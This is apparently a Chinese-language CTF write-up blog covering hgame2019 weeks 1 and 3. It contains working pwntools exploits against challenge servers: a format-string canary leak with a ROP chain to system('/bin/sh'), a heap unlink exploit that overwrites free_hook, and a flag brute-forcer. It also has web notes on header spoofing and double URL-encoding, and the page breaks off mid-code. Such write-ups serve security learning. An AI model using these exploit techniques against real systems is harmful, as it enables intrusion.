<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;bash&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span>(<span class="params">a=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">	gdb.attach(cn,a)</span><br><span class="line">	<span class="keyword">if</span> a == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">		raw_input()</span><br><span class="line"></span><br><span class="line">key=<span class="string">&#x27;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxy&#123;&#125;_@!&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;hgame&#123;&#x27;</span></span><br><span class="line"><span class="comment">#flag=&#x27;&#x27;</span></span><br><span class="line">n=<span class="number">18</span></span><br><span class="line"><span class="keyword">while</span>(n):</span><br><span class="line">    <span class="comment">#cn=process(&#x27;./CSTW&#x27;)</span></span><br><span class="line">    cn=remote(<span class="string">&#x27;118.24.3.214&#x27;</span>,<span class="number">10001</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">&#x27;Chapter 1\n&#x27;</span>)</span><br><span class="line">    cn.send(<span class="string">&#x27;aaaaa&#x27;</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">&#x27;串咒语——\n&#x27;</span>)</span><br><span class="line">    test=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">        test = flag+i+<span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">        cn.send(test)</span><br><span class="line">        a=cn.recvline()</span><br><span class="line">        <span class="comment">#sleep(0.1)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;觉醒了&#x27;</span> <span class="keyword">in</span> a:</span><br><span class="line">            flag+=i</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            n-=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        cn.recvline()</span><br><span class="line">    <span class="comment">#cn.send(&#x27;a&#x27;)</span></span><br><span class="line">    <span class="comment">#cn.recvline()</span></span><br><span class="line">    cn.close()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure>

<p>坑特别的多，都是细节坑，感觉自己能踩得都踩了，学到了好多，要是不清楚的话，可以sl一下</p>
<h4 id="Steins-Gate"><a href="#Steins-Gate" class="headerlink" title="Steins;Gate"></a>Steins;Gate</h4><p>这题canary和NX还是全部开启了，先分析一下这程序要干嘛</p>
<p><img src="https://github.com/woaixiaoyuyu/MarkdownPhotos/raw/master/hgame2019_week1/pwn-2-1.png" alt="img"></p>
<p>main函数里面结构是由一个函数套一个函数来运作的，不是很理解，运行一下看看</p>
<p><img src="https://github.com/woaixiaoyuyu/MarkdownPhotos/raw/master/hgame2019_week1/pwn-2-2.png" alt="img"></p>
<p>看见了我们函数400A91中的字符串，再结合一下别的函数，大概知道就是人类的本质是复读机的故事………………</p>
<p>最开头的那个AF1函数看不出个所以然，感觉就是弄个随机数的种子出来，有一点要注意到，read函数读取的地址在bss字段上，万一之后用的上呢，如下</p>
<p><img src="https://github.com/woaixiaoyuyu/MarkdownPhotos/raw/master/hgame2019_week1/pwn-2-3.png" alt="1548907835474"></p>
<p>然后看看函数8F6，如下</p>
<p><img src="https://github.com/woaixiaoyuyu/MarkdownPhotos/raw/master/hgame2019_week1/pwn-2-4.png" alt="1548907848397"></p>
<p>有溢出空间哦，但是有canary，不能跳转的情况下，而且我们只有两次利用这个溢出的机会，应该不会是爆破canary</p>
<p>继续看下一个函数958，有格式化字符串漏洞，nice，可以试着泄露canary了</p>
<p>继续看下一个函数A00，发现还是有格式化字符串漏洞，如下</p>
<p><img src="https://github.com/woaixiaoyuyu/MarkdownPhotos/raw/master/hgame2019_week1/pwn-2-5.png" alt="1548905455729"></p>
<p>这里很贴心的可以read五个字节，感觉很贴心的可以leak canary</p>
<p>最后再看看程序本身有什么可以利用的，我们发现了程序里有system函数，然后还想到了，我们的ID可以取为/bin/sh，直接写入bss字段方便以后用</p>
<p>这题目有挺多条件要绕过的，第一个就是v2，这个直接靠溢出就可以做：padding+p64(0x2333)</p>
<p>第二个要绕过的是v4-4660!=v0，这里有毒，刚开始已经说了v0=v4了，所以我们要靠格式化字符串漏洞泄露出v0或者v4，然后把v4同样覆盖成我们需要的，我们可以看到v0的偏移量，如下</p>
<p><img src="https://github.com/woaixiaoyuyu/MarkdownPhotos/raw/master/hgame2019_week1/pwn-2-6.png" alt="1548905470930"></p>
<p>在gdb里下断点看一下，我是在运行前记住了eax的值，然后运行后找这值去哪里了，找到了，就确定v0的偏移量：2+6-1=7</p>
<p>等绕过了这一段，我们再看一下如下，还需要一个0x6666</p>
<p><img src="https://github.com/woaixiaoyuyu/MarkdownPhotos/raw/master/hgame2019_week1/pwn-2-7.png" alt="1548905491450"></p>
<p>我们这里没有足够的空间覆盖，但在上一个函数可以提前覆盖好</p>
<p>老样子利用格式化字符串漏洞泄露出canary，然后之后最后一个函数有一个栈溢出，可以用函数中的system函数，以及我们之前准备的/bin/sh了，这里要注意一下64位与32位程序在linux环境下的传参顺序，rdi/rsi/rdx，如果bin的培训作业做了的话应该就了解了呢</p>
<p>rdi的地址我们可以通过RoPgadget泄露，如下</p>
<p><img src="https://github.com/woaixiaoyuyu/MarkdownPhotos/raw/master/hgame2019_week1/pwn-2-8.png" alt="1548905516029"></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;bash&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	cn = process(<span class="string">&#x27;./Gate&#x27;</span>)</span><br><span class="line">	<span class="built_in">bin</span> = ELF(<span class="string">&#x27;./Gate&#x27;</span>)</span><br><span class="line">	<span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">	<span class="comment">#libc = ELF(&#x27;/lib/i386-linux-gnu/libc-2.23.so&#x27;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	cn = remote(<span class="string">&#x27;118.24.3.214&#x27;</span>,<span class="number">10002</span>)</span><br><span class="line">	<span class="built_in">bin</span> = ELF(<span class="string">&#x27;./Gate&#x27;</span>)</span><br><span class="line">	<span class="comment">#libc = ELF(&#x27;&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span>(<span class="params">a=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">	gdb.attach(cn,a)</span><br><span class="line">	<span class="keyword">if</span> a == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">		raw_input()</span><br><span class="line"></span><br><span class="line"><span class="comment">#z(&#x27;b *0x0000000000400998\nc&#x27;)</span></span><br><span class="line"><span class="comment">#z(&#x27;b *0x000000000040097A\nc&#x27;)</span></span><br><span class="line"><span class="comment">#z(&#x27;b *0x00000000004009CD\nc&#x27;)</span></span><br><span class="line"><span class="comment">#z(&#x27;b *0x0000000000400A32\nc&#x27;)</span></span><br><span class="line"><span class="comment">#z(&#x27;b *0x0000000000400A47\nc&#x27;)</span></span><br><span class="line"><span class="comment">#z(&#x27;b *0x0000000000400A32\nc&#x27;)</span></span><br><span class="line"><span class="comment">#z(&#x27;b *0x0000000000400928\nc\nc&#x27;)</span></span><br><span class="line">cn.recvuntil(<span class="string">&#x27;ID:&#x27;</span>)</span><br><span class="line">cn.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">cn.recvuntil(<span class="string">&#x27;world.&#x27;</span>)</span><br><span class="line">payload=(<span class="number">0x40</span>-<span class="number">0x10</span>)*<span class="string">&#x27;a&#x27;</span>+p64(<span class="number">0x2333</span>)</span><br><span class="line">cn.send(payload)</span><br><span class="line"><span class="comment"># leak rand num</span></span><br><span class="line">cn.recvuntil(<span class="string">&#x27;man.&#x27;</span>)</span><br><span class="line">payload2=<span class="string">&#x27;%7$p&#x27;</span></span><br><span class="line">cn.send(payload2)</span><br><span class="line">num=<span class="built_in">int</span>(cn.recvuntil(<span class="string">&#x27;it?&#x27;</span>)[:<span class="number">11</span>],<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(num))</span><br><span class="line">payload3=(<span class="number">0x40</span>-<span class="number">0x24</span>)*<span class="string">&#x27;a&#x27;</span>+p32(<span class="number">0x6666</span>)+(<span class="number">0x40</span>-<span class="number">0x10</span>-<span class="number">0x24</span>+<span class="number">4</span>)*<span class="string">&#x27;a&#x27;</span>+p32(<span class="number">0x1234</span>+num)</span><br><span class="line">cn.send(payload3)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak canary</span></span><br><span class="line">cn.recvuntil(<span class="string">&#x27;Payment of past debts.&#x27;</span>)</span><br><span class="line">payload4=<span class="string">&#x27;%11$p&#x27;</span></span><br><span class="line">cn.send(payload4)</span><br><span class="line"><span class="comment">#cn.recvline()</span></span><br><span class="line">canary=cn.recvuntil(<span class="string">&quot;To seek the truth of the world.\n&quot;</span>)[:-<span class="number">0x46</span>]</span><br><span class="line">canary=<span class="built_in">int</span>(canary,<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line"><span class="comment">#get shell</span></span><br><span class="line">system_addr=<span class="built_in">bin</span>.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">rdi_addr=<span class="number">0x0000000000400c73</span></span><br><span class="line">bin_sh=<span class="number">0x0000000000602040</span></span><br><span class="line"><span class="comment">#cn.recvuntil(&#x27;To seek the truth of the world.&#x27;)</span></span><br><span class="line">payload5=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x40</span>-<span class="number">0x10</span>)+p64(<span class="number">0x2333</span>)+p64(canary)+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(rdi_addr)+p64(bin_sh)+p64(system_addr)</span><br><span class="line">cn.send(payload5)</span><br><span class="line"><span class="comment">#cn.sendline()</span></span><br><span class="line"></span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="Web-从0学起"><a href="#Web-从0学起" class="headerlink" title="Web(从0学起)"></a>Web(从0学起)</h2><h4 id="谁吃了我的flag"><a href="#谁吃了我的flag" class="headerlink" title="谁吃了我的flag"></a>谁吃了我的flag</h4><p>最后加上.index.html.swp，应该是vim编辑器备份文件，会得到一个txt，里面就有flag</p>
<h4 id="换头大作战"><a href="#换头大作战" class="headerlink" title="换头大作战"></a>换头大作战</h4><p>这题是我第一次用burp，疯狂换东西</p>
<p>刚开始是问你要不要flag，说post会好一下</p>
<p><img src="https://github.com/woaixiaoyuyu/MarkdownPhotos/raw/master/hgame2019_week1/web1-1.png" alt="1548913879002"></p>
<p>先改request method 然后在给input 段发一点东西 name是want</p>
<p><img src="https://github.com/woaixiaoyuyu/MarkdownPhotos/raw/master/hgame2019_week1/web1-2.png" alt="1548914070514"></p>
<p>提示说only localhost can get flag，这里学到了一个操作叫x-forwarded-for，可以改来源ip</p>
<p><img src="https://github.com/woaixiaoyuyu/MarkdownPhotos/raw/master/hgame2019_week1/web1-3.png" alt="1548914506510"></p>
<p>然后接下来需要改user_agent</p>
<p>网上找到了[Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:24.0) Gecko/20100101 Firefox/24.0 Waterfox/24.0](<a href="https://udger.com/resources/online-parser?Fuas=Mozilla/5.0">https://udger.com/resources/online-parser?Fuas=Mozilla/5.0</a> (Windows NT 6.1; Win64; x64; rv:24.0) Gecko/20100101 Firefox/24.0 Waterfox/24.0)</p>
<p>但是版本不是50.0，改一下就好</p>
<p><img src="https://github.com/woaixiaoyuyu/MarkdownPhotos/raw/master/hgame2019_week1/web1-4.png" alt="1548915165394"></p>
<p>还需要改referer网站来源，改成b站</p>
<p>改完之后会说you are not admin，这是最后一次了</p>
<p><img src="https://github.com/woaixiaoyuyu/MarkdownPhotos/raw/master/hgame2019_week1/web1-5.png" alt="1548915618668"></p>
<h4 id="very-easy-web"><a href="#very-easy-web" class="headerlink" title="very easy web"></a>very easy web</h4><p>题目介绍是代码审计初体验，源码如下</p>
<p><img src="https://github.com/woaixiaoyuyu/MarkdownPhotos/raw/master/hgame2019_week1/web3-1.png" alt="1548908738616"></p>
<p>那我们构造一下id就好，本来是直接在后面加上?id=vidar，但并不可以，因为url会被url decode一次，然后源码内还有一次url decode，所以要将vidar进行两次url encode</p>
<p>?id=%25%37%36%25%36%39%25%36%34%25%36%31%25%37%32</p>
<h4 id="can-u-find-me"><a href="#can-u-find-me" class="headerlink" title="can u find me?"></a>can u find me?</h4><p>先按照题目提示f12一下，找到f12.php</p>
<p><img src="https://github.com/woaixiaoyuyu/MarkdownPhotos/raw/master/hgame2019_week1/web2-1.png" alt="1548912209651"></p>
<p>需要密码，我们burp拦截一下试试</p>
<p><img src="https://github.com/woaixiaoyuyu/MarkdownPhotos/raw/master/hgame2019_week1/web2-2.png" alt="1548913199200"></p>
<p>可以看见我们要的密码，修该一下发送method，再添加password再发送一次</p>
<p><img src="https://github.com/woaixiaoyuyu/MarkdownPhotos/raw/master/hgame2019_week1/web-2-3.png" alt="1548913440107"></p>
<p>出现了click me to get flag的字眼，点击的时候还是需要burp，不然会说aoh,your speed is sososo fast,the flag must have been left in somewhere，答案如下</p>
<p><img src="https://github.com/woaixiaoyuyu/MarkdownPhotos/raw/master/hgame2019_week1/web2-4.png" alt="1548913720072"></p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h4 id="Hidden-Image-in-LSB"><a href="#Hidden-Image-in-LSB" class="headerlink" title="Hidden Image in LSB"></a>Hidden Image in LSB</h4><p>用Stegsolve打开，观察各通道，有一个通道里就有答案哦</p>
<h4 id="打字机"><a href="#打字机" class="headerlink" title="打字机"></a>打字机</h4><p>用眼睛看就完事了，感觉就是键盘码，有很多重复的字符，开头肯定是hgame，后面_这个字符键盘对应位置上没有的，所以就是_，最后那个单词，题目是打字机，眼拔flag，typewriter(正好英语黄皮书第三篇晨读后面有这个单词，看到就猜到了)，但后把重复的字符改过来就好，注意大小写，和键盘长得一样的是大写，不然就是小写</p>
<h4 id="Broken-Chest"><a href="#Broken-Chest" class="headerlink" title="Broken Chest"></a>Broken Chest</h4><p>Zip的文件头被修改了，用Hex Editor改过来打开就OK，然后需要密码，目测加密位不是伪加密，用binwalk分解，可以看到有comment，comment的内容就是密码</p>
<h4 id="Try"><a href="#Try" class="headerlink" title="Try"></a>Try</h4><p>我先去百度了一下这文件格式是什么，然后发现貌似是流量分析，在wireshark里常有了一波后，发现了png和zip，后来我选择了zip分析一下,zip可以直接提取放进Hex Editor中分析</p>
<p>打开zip，发现有个password文件，打开，里面写着hgame********</p>
<p>flag应该就是压缩包的密码，有一种爆破的冲动，我先用mask掩码攻击爆破(hgame{??????})，工具采用azpr，跑出来结果是hgame25839421</p>
<p>打开之后有一张图片，应该就是图片隐写，binwalk一下，发现图片里有压缩包需要密码和一个1.docx，压缩包里还有一个1.docx，怀疑是明文攻击，伪加密也有可能</p>
<p>看了头部知道是伪加密(加密位是00，不是09)，改最底下的加密标志位，成功打开，打开docx，还是空白的，rlgl</p>
<p>那最后一招了……百度了一下word隐写，谁百度谁知道</p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h4 id="Mix"><a href="#Mix" class="headerlink" title="Mix"></a>Mix</h4><p>这题初看题目，可以发现是摩斯密码，如果不清楚，百度一下类似的密文也可以知道的</p>
<p>解密之后可以看见{}，但是不在我们需要的位置上，毕竟flag的格式我们是知道的，移位操作我们可以用栅栏解密</p>
<p>之后还是没有hgame，我们可以考虑用凯撒来解密</p>
<p>解密后有可能flag不对，因为用在线解密的时候，会自动大写转小写的，要改回去哦</p>
<h4 id="Base全家"><a href="#Base全家" class="headerlink" title="Base全家"></a>Base全家</h4><p>这题你真的让我还原一遍，难度是有点高，我是一个个眼睛边看边解迷的，快20轮了吧233</p>
<p>提几个要点吧，最后一轮是base58，在这题之前我还不知道有这个base方法，后来实在解不出了，百度后才知道的</p>
<p>然后如果直接复制黏贴的话比较硬核，可以选择用保存伪文件后，处理文件的方式来解决比较方便</p>
]]></content>
      <tags>
        <tag>ctf</tag>
        <tag>hgame</tag>
      </tags>
  </entry>
  <entry>
    <title>hgame2019_week3_wp</title>
    <url>/2019/02/16/hgame2019-week3-wp/</url>
    <content><![CDATA[<p>上周的wp我咕了，图片太多，云不想弄，第三周堆有点难受，之后把tcache抽空学一下</p>
<span id="more"></span>

<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h4 id="namebook"><a href="#namebook" class="headerlink" title="namebook"></a>namebook</h4><p>打开程序，五个功能，没有开启PIE，没有后门函数以及system，需要泄露</p>
<p>64为程序中，每一次创建的chunk是0x80大小，实际大小0x90，最多建立10个name</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eachname</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> ptr[i];   <span class="comment">//size:0x80</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析一下个函数有啥问题</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">set</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">  v1 = myread();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">9</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;invalid range&quot;</span>);</span><br><span class="line">  ptr[v1] = <span class="built_in">malloc</span>(<span class="number">0x80</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;name:&quot;</span>);</span><br><span class="line">  sub_400876(ptr[v1], <span class="number">0x80</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;done.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">reset</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">  v1 = myread();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">9</span> || !ptr[v1] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;invalid range&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;name:&quot;</span>);</span><br><span class="line">  sub_400876(ptr[v1], <span class="number">0x100</span>u);    <span class="comment">//可以覆盖</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;done.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以看到初始的ptr在bss字段上，bss字段上存放的数据只有data，通过覆盖我们可以修改bk的pre_inuse，从而执行在freechunk1的时候unlink chunk0</p>
<p>一开始是想unlink完直接该got表内容，但是vmmap看了一下，got表是不可写的，唉RELRO真难受</p>
<p>问了aris，提示是malloc_hook,free_hook</p>
<p>malloc函数会首先检查malloc_hook的值，若不为0则会调用他。若我们能通过内存写入malloc_hook即可实现任意地址跳转</p>
<p>调试的时候坑还是挺多的</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;bash&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	cn = process(<span class="string">&#x27;./namebook&#x27;</span>)</span><br><span class="line">	<span class="built_in">bin</span> = ELF(<span class="string">&#x27;./namebook&#x27;</span>)</span><br><span class="line">	libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">	<span class="comment">#libc = ELF(&#x27;/lib/i386-linux-gnu/libc-2.23.so&#x27;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	cn = remote(<span class="string">&#x27;118.24.3.214&#x27;</span>,<span class="number">12344</span>)</span><br><span class="line">	<span class="built_in">bin</span> = ELF(<span class="string">&#x27;./namebook&#x27;</span>)</span><br><span class="line">	libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span>(<span class="params">a=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">	gdb.attach(cn,a)</span><br><span class="line">	<span class="keyword">if</span> a == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">		raw_input()</span><br><span class="line"></span><br><span class="line"><span class="comment"># function</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    cn.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">&#x27;index:&#x27;</span>)</span><br><span class="line">    cn.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    cn.recvuntil(<span class="string">&#x27;name:&#x27;</span>)</span><br><span class="line">    cn.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    cn.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">&#x27;index:&#x27;</span>)</span><br><span class="line">    cn.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">idx</span>):</span></span><br><span class="line">    cn.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">&#x27;index:&#x27;</span>)</span><br><span class="line">    cn.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reset</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    cn.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    cn.recvuntil(<span class="string">&#x27;index:&#x27;</span>)</span><br><span class="line">    cn.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    cn.recvuntil(<span class="string">&#x27;name:&#x27;</span>)</span><br><span class="line">    cn.sendline(content)</span><br><span class="line"></span><br><span class="line">malloc=<span class="built_in">bin</span>.got[<span class="string">&#x27;malloc&#x27;</span>]</span><br><span class="line">free_hook=<span class="number">0x00000000003c67a8</span></span><br><span class="line"><span class="comment">#z(&#x27;disassemble main&#x27;)</span></span><br><span class="line"><span class="comment">#z(&#x27;b *0x0000000000400A3B\nb *0x0000000000400A85\nc&#x27;)</span></span><br><span class="line"><span class="comment">#z(&#x27;b *0x0000000000400A85\nb *0x0000000000400AFF\nc&#x27;)</span></span><br><span class="line"><span class="comment">#z(&#x27;b *0x0000000000400B9B\nc\nc\nc&#x27;)</span></span><br><span class="line"><span class="comment">#z(&#x27;b *0x0000000000400B72\nc&#x27;)</span></span><br><span class="line">ptr_addr=<span class="number">0x602040</span></span><br><span class="line">chunk1_addr=ptr_addr+<span class="number">0x90</span></span><br><span class="line"><span class="comment"># build chunk</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="built_in">set</span>(i,<span class="number">0x80</span>*<span class="built_in">str</span>(i))</span><br><span class="line"><span class="comment"># edit 0 to overflow 1</span></span><br><span class="line"><span class="comment"># 0.fd + 0.bk + 0.data + 1.presize + 1.size</span></span><br><span class="line">payload=p64(<span class="number">0x90</span>)+p64(<span class="number">0x80</span>)+p64(ptr_addr-<span class="number">0x18</span>)+p64(ptr_addr-<span class="number">0x10</span>)+<span class="string">&#x27;0&#x27;</span>*<span class="number">0x60</span>+p64(<span class="number">0x80</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">reset(<span class="number">0</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>) <span class="comment"># chunk0_addr changed to ptr-0x18</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(ptr_addr-<span class="number">0x18</span>)</span><br><span class="line">payload+=p64(malloc)</span><br><span class="line">reset(<span class="number">0</span>,payload) <span class="comment"># change ptr to malloc.got</span></span><br><span class="line">get(<span class="number">1</span>)</span><br><span class="line">malloc_addr=cn.recvuntil(<span class="string">&#x27;\x0a&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line">cn.recv()</span><br><span class="line">malloc_addr=u64(malloc_addr+<span class="string">&#x27;\x00&#x27;</span>*(<span class="number">8</span>-<span class="built_in">len</span>(malloc_addr)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;malloc_addr:&#x27;</span>+<span class="built_in">hex</span>(malloc_addr))</span><br><span class="line">libc.base=malloc_addr-libc.symbols[<span class="string">&#x27;malloc&#x27;</span>]</span><br><span class="line">system_addr=libc.base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook=libc.base+free_hook</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc.base:&#x27;</span>+<span class="built_in">hex</span>(libc.base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;system_addr:&quot;</span>+<span class="built_in">hex</span>(system_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;free_hook:&#x27;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line"><span class="comment"># change chunk1 to free_hook</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(ptr_addr)</span><br><span class="line">payload+=p64(free_hook)</span><br><span class="line">reset(<span class="number">0</span>,payload)</span><br><span class="line"><span class="comment"># change free_hook to system</span></span><br><span class="line">reset(<span class="number">1</span>,p64(system_addr))</span><br><span class="line"><span class="comment"># prepare /bin/sh</span></span><br><span class="line">payload=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">reset(<span class="number">2</span>,payload)</span><br><span class="line"><span class="comment">#get shell</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure>

<p>知识点：unlink、free_hook、分析堆块在bss字段上的结构体</p>
<h4 id="薯片拯救世界3"><a href="#薯片拯救世界3" class="headerlink" title="薯片拯救世界3"></a>薯片拯救世界3</h4><p>检查一下程序有啥，有一个backdoor函数，partial relro，没有pie，我现在的想法就是把got表改成backdoor</p>
<p>函数主体如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      Menu();</span><br><span class="line">      putchar(<span class="string">&#x27;&gt;&#x27;</span>);</span><br><span class="line">      v3 = sub_4009BA();</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      Edit();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        send(<span class="string">&#x27;&gt;&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          puts(<span class="string">&quot;相信会吸引很多的强♂ 者前来&quot;</span>);</span><br><span class="line">          exit(<span class="number">0</span>);</span><br><span class="line">  